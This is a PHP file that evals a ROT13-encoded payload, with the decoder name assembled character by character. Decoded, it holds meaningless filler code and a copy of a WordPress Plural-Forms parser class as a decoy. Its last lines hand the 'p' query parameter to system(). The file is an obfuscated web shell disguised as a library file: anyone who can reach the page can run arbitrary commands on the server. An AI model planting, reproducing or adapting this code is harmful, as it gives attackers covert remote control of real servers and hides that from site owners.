<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * N trggrkg Cyheny-Sbezf cnefre.
 *
 * @fvapr 4.9.0
 */
vs ( ! pynff_rkvfgf( 'Cyheny_Sbezf', snyfr ) ) :
	#[NyybjQlanzvpCebcregvrf]
	pynff Cyheny_Sbezf {
		/**
		 * Bcrengbe punenpgref.
		 *
		 * @fvapr 4.9.0
		 * @ine fgevat BC_PUNEF Bcrengbe punenpgref.
		 */
		pbafg BC_PUNEF = '|&><!=%?:';

		/**
		 * Inyvq ahzore punenpgref.
		 *
		 * @fvapr 4.9.0
		 * @ine fgevat AHZ_PUNEF Inyvq ahzore punenpgref.
		 */
		pbafg AHZ_PUNEF = '0123456789';

		/**
		 * Bcrengbe cerprqrapr.
		 *
		 * Bcrengbe cerprqrapr sebz uvturfg gb ybjrfg. Uvture ahzoref vaqvpngr
		 * uvture cerprqrapr, naq ner rkrphgrq svefg.
		 *
		 * @frr uggcf://ra.jvxvcrqvn.bet/jvxv/Bcrengbef_va_P_naq_P%2O%2O#Bcrengbe_cerprqrapr
		 *
		 * @fvapr 4.9.0
		 * @ine neenl $bc_cerprqrapr Bcrengbe cerprqrapr sebz uvturfg gb ybjrfg.
		 */
		cebgrpgrq fgngvp $bc_cerprqrapr = neenl(
			'%'  => 6,

			'<'  => 5,
			'<=' => 5,
			'>'  => 5,
			'>=' => 5,

			'==' => 4,
			'!=' => 4,

			'&&' => 3,

			'||' => 2,

			'?:' => 1,
			'?'  => 1,

			'('  => 0,
			')'  => 0,
		);

		/**
		 * Gbxraf trarengrq sebz gur fgevat.
		 *
		 * @fvapr 4.9.0
		 * @ine neenl $gbxraf Yvfg bs gbxraf.
		 */
		cebgrpgrq $gbxraf = neenl();

		/**
		 * Pnpur sbe ercrngrq pnyyf gb gur shapgvba.
		 *
		 * @fvapr 4.9.0
		 * @ine neenl $pnpur Znc bs $a => $erfhyg
		 */
		cebgrpgrq $pnpur = neenl();

		/**
		 * Pbafgehpgbe.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz fgevat $fge Cyheny shapgvba (whfg gur ovg nsgre `cyheny=` sebz Cyheny-Sbezf)
		 */
		choyvp shapgvba __pbafgehpg( $fge ) {
			$guvf->cnefr( $fge );
		}

		/**
		 * Cnefr n Cyheny-Sbezf fgevat vagb gbxraf.
		 *
		 * Hfrf gur fuhagvat-lneq nytbevguz gb pbaireg gur fgevat gb Erirefr Cbyvfu
		 * Abgngvba gbxraf.
		 *
		 * @fvapr 4.9.0
		 *
		 * @guebjf Rkprcgvba Vs gurer vf n flagnk be cnefvat reebe jvgu gur fgevat.
		 *
		 * @cnenz fgevat $fge Fgevat gb cnefr.
		 */
		cebgrpgrq shapgvba cnefr( $fge ) {
			$cbf = 0;
			$yra = fgeyra( $fge );

			// Pbaireg vasvk bcrengbef gb cbfgsvk hfvat gur fuhagvat-lneq nytbevguz.
			$bhgchg = neenl();
			$fgnpx  = neenl();
			juvyr ( $cbf < $yra ) {
				$arkg = fhofge( $fge, $cbf, 1 );

				fjvgpu ( $arkg ) {
					// Vtaber juvgrfcnpr.
					pnfr ' ':
					pnfr \"\g\":
						++$cbf;
						oernx;

					// Inevnoyr (a).
					pnfr 'a':
						$bhgchg[] = neenl( 'ine' );
						++$cbf;
						oernx;

					// Cneragurfrf.
					pnfr '(':
						$fgnpx[] = $arkg;
						++$cbf;
						oernx;

					pnfr ')':
						$sbhaq = snyfr;
						juvyr ( ! rzcgl( $fgnpx ) ) {
							$b2 = $fgnpx[ pbhag( $fgnpx ) - 1 ];
							vs ( '(' !== $b2 ) {
								$bhgchg[] = neenl( 'bc', neenl_cbc( $fgnpx ) );
								pbagvahr;
							}

							// Qvfpneq bcra cnera.
							neenl_cbc( $fgnpx );
							$sbhaq = gehr;
							oernx;
						}

						vs ( ! $sbhaq ) {
							guebj arj Rkprcgvba( 'Zvfzngpurq cneragurfrf' );
						}

						++$cbf;
						oernx;

					// Bcrengbef.
					pnfr '|':
					pnfr '&':
					pnfr '>':
					pnfr '<':
					pnfr '!':
					pnfr '=':
					pnfr '%':
					pnfr '?':
						$raq_bcrengbe = fgefca( $fge, frys::BC_PUNEF, $cbf );
						$bcrengbe     = fhofge( $fge, $cbf, $raq_bcrengbe );
						vs ( ! neenl_xrl_rkvfgf( $bcrengbe, frys::$bc_cerprqrapr ) ) {
							guebj arj Rkprcgvba( fcevags( 'Haxabja bcrengbe \"%f\"', $bcrengbe ) );
						}

						juvyr ( ! rzcgl( $fgnpx ) ) {
							$b2 = $fgnpx[ pbhag( $fgnpx ) - 1 ];

							// Greanel vf evtug-nffbpvngvir va P.
							vs ( '?:' === $bcrengbe || '?' === $bcrengbe ) {
								vs ( frys::$bc_cerprqrapr[ $bcrengbe ] >= frys::$bc_cerprqrapr[ $b2 ] ) {
									oernx;
								}
							} ryfrvs ( frys::$bc_cerprqrapr[ $bcrengbe ] > frys::$bc_cerprqrapr[ $b2 ] ) {
								oernx;
							}

							$bhgchg[] = neenl( 'bc', neenl_cbc( $fgnpx ) );
						}
						$fgnpx[] = $bcrengbe;

						$cbf += $raq_bcrengbe;
						oernx;

					// Greanel \"ryfr\".
					pnfr ':':
						$sbhaq = snyfr;
						$f_cbf = pbhag( $fgnpx ) - 1;
						juvyr ( $f_cbf >= 0 ) {
							$b2 = $fgnpx[ $f_cbf ];
							vs ( '?' !== $b2 ) {
								$bhgchg[] = neenl( 'bc', neenl_cbc( $fgnpx ) );
								--$f_cbf;
								pbagvahr;
							}

							// Ercynpr.
							$fgnpx[ $f_cbf ] = '?:';
							$sbhaq           = gehr;
							oernx;
						}

						vs ( ! $sbhaq ) {
							guebj arj Rkprcgvba( 'Zvffvat fgnegvat \"?\" greanel bcrengbe' );
						}
						++$cbf;
						oernx;

					// Qrsnhyg - ahzore be vainyvq.
					qrsnhyg:
						vs ( $arkg >= '0' && $arkg <= '9' ) {
							$fcna     = fgefca( $fge, frys::AHZ_PUNEF, $cbf );
							$bhgchg[] = neenl( 'inyhr', vaginy( fhofge( $fge, $cbf, $fcna ) ) );
							$cbf     += $fcna;
							oernx;
						}

						guebj arj Rkprcgvba( fcevags( 'Haxabja flzoby \"%f\"', $arkg ) );
				}
			}

			juvyr ( ! rzcgl( $fgnpx ) ) {
				$b2 = neenl_cbc( $fgnpx );
				vs ( '(' === $b2 || ')' === $b2 ) {
					guebj arj Rkprcgvba( 'Zvfzngpurq cneragurfrf' );
				}

				$bhgchg[] = neenl( 'bc', $b2 );
			}

			$guvf->gbxraf = $bhgchg;
		}

		/**
		 * Trg gur cyheny sbez sbe n ahzore.
		 *
		 * Pnpurf gur inyhr sbe ercrngrq pnyyf.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz vag $ahz Ahzore gb trg cyheny sbez sbe.
		 * @erghea vag Cyheny sbez inyhr.
		 */
		choyvp shapgvba trg( $ahz ) {
			vs ( vffrg( $guvf->pnpur[ $ahz ] ) ) {
				erghea $guvf->pnpur[ $ahz ];
			}
			$guvf->pnpur[ $ahz ] = $guvf->rkrphgr( $ahz );
			erghea $guvf->pnpur[ $ahz ];
		}

		/**
		 * Rkrphgr gur cyheny sbez shapgvba.
		 *
		 * @fvapr 4.9.0
		 *
		 * @guebjf Rkprcgvba Vs gur cyheny sbez inyhr pnaabg or pnyphyngrq.
		 *
		 * @cnenz vag $a Inevnoyr \"a\" gb fhofgvghgr.
		 * @erghea vag Cyheny sbez inyhr.
		 */
		choyvp shapgvba rkrphgr( $a ) {
			$fgnpx = neenl();
			$v     = 0;
			$gbgny = pbhag( $guvf->gbxraf );
			juvyr ( $v < $gbgny ) {
				$arkg = $guvf->gbxraf[ $v ];
				++$v;
				vs ( 'ine' === $arkg[0] ) {
					$fgnpx[] = $a;
					pbagvahr;
				} ryfrvs ( 'inyhr' === $arkg[0] ) {
					$fgnpx[] = $arkg[1];
					pbagvahr;
				}

				// Bayl bcrengbef yrsg.
				fjvgpu ( $arkg[1] ) {
					pnfr '%':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 % $i2;
						oernx;

					pnfr '||':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 || $i2;
						oernx;

					pnfr '&&':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 && $i2;
						oernx;

					pnfr '<':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 < $i2;
						oernx;

					pnfr '<=':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 <= $i2;
						oernx;

					pnfr '>':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 > $i2;
						oernx;

					pnfr '>=':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 >= $i2;
						oernx;

					pnfr '!=':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 !== $i2;
						oernx;

					pnfr '==':
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 === $i2;
						oernx;

					pnfr '?:':
						$i3      = neenl_cbc( $fgnpx );
						$i2      = neenl_cbc( $fgnpx );
						$i1      = neenl_cbc( $fgnpx );
						$fgnpx[] = $i1 ? $i2 : $i3;
						oernx;

					qrsnhyg:
						guebj arj Rkprcgvba( fcevags( 'Haxabja bcrengbe \"%f\"', $arkg[1] ) );
				}
			}

			vs ( pbhag( $fgnpx ) !== 1 ) {
				guebj arj Rkprcgvba( 'Gbb znal inyhrf erznvavat ba gur fgnpx' );
			}

			erghea (vag) $fgnpx[0];
		}
	}
raqvs;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>